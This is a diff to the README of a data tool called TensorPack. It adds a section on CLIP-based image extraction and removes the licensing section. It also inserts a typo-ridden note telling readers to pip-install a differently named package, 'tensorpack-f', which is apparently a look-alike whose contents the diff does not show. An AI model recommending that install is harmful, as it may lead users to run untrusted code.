@@ -33,6 +33,33 @@ TensorPack supports a wide range of input and output formats:
 
 ### Custom Format Support
 TensorPack supports **extensible format handling** through custom transforms. You can add support for any proprietary or specialized format (including `.parquet`, `.hdf5`, `.mat`, etc.) by registering custom Python transforms that act as file loaders.
+# Quick Note
+custom format support is not avaiable via programmatic use but avaiable in pypi you can download via python -m pip install tensorpack-f==0.1.8
+
+
+## CLIP-based Semantic Extraction
+
+TensorPack now uses a CLIP-based semantic extractor for images and videos (via `open_clip`).
+This replaces the earlier OCR-first approach. Note:
+
+- CLIP does not perform OCR or provide bounding boxes. Instead it produces
+  image embeddings useful for semantic search, similarity and zero-shot
+  classification.
+- The default model configured is a Metaclip variant (`metaclip_400m`) with
+  `ViT-B-32` but you can change this via the `configure_clip` function in
+  `tensorpack.ocr_integration` (keeps backwards-compatible alias `configure_ocr`).
+
+Quick example (Python):
+
+```python
+import open_clip
+model, _, preprocess = open_clip.create_model_and_transforms('ViT-B-32', pretrained='metaclip_400m')
+tokenizer = open_clip.get_tokenizer('ViT-B-32')
+```
+
+If you need true OCR with bounding boxes, keep using an external OCR tool
+or add a custom transform that wraps an OCR backend (e.g., Tesseract or
+PaddleOCR).
 
 ## Table of Contents
 
@@ -259,28 +286,6 @@ Each command supports various export formats:
 
 Use `--export-formats all` to export in all available formats, or specify individual formats with comma-separated values.
 
-## License
-
-To use TensorPack, a license is required. Please request one by filling out the form below.
-
-[![Request a License](https://www.gstatic.com/images/branding/product/1x/forms_48dp.png)](https://docs.google.com/forms/d/e/1FAIpQLSe99mLhzKhcGwM8gvmw4Bf-Z5j0FMBmDHuUavN06mSZ55LgiA/viewform?usp=sharing&ouid=113684697499334755912)
-
-Click the Google Forms logo above to open the License Request Form.
-
-### License Types
-
-This platform is freely available for academic use in the UK. For non-academic capabilities, an early access premium license is available.
-
-TensorPack offers several license tiers:
-
-- **Free**: Basic functionality with limited usage. Machine-bound to prevent abuse.
-- **Trial**: Full functionality for 14 days.
-- **Academic**: Full functionality for academic users (automatically detected via email domain).
-- **Premium**: Full functionality with no limitations.
-
-### Machine Binding
-
-Free licenses are bound to the machine they are activated on. This prevents license abuse while still allowing legitimate free tier usage. If you need to use TensorPack on multiple machines, consider upgrading to a premium license.
 
 ## Installation
 
